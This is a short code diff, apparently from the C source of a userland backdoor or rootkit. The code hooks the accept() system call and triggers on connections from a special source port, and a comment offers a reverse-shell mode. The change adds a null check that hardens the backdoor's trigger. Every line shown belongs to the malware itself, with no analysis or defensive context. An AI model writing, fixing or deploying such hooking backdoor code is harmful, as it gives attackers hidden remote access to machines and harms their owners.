@@ -20,7 +20,7 @@ int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen) {
 	int check = o_accept(sockfd, addr, addrlen);
 	struct sockaddr_in * tmp = (struct sockaddr_in *)addr;
 
-	if(ntohs(tmp->sin_port) == SOURCEPORT) {
+	if(tmp && ntohs(tmp->sin_port) == SOURCEPORT) {
 		/*
 		// uncomment and comment out the rest to connect via a reverse shell instead
 		struct in_addr ip = tmp->sin_addr;
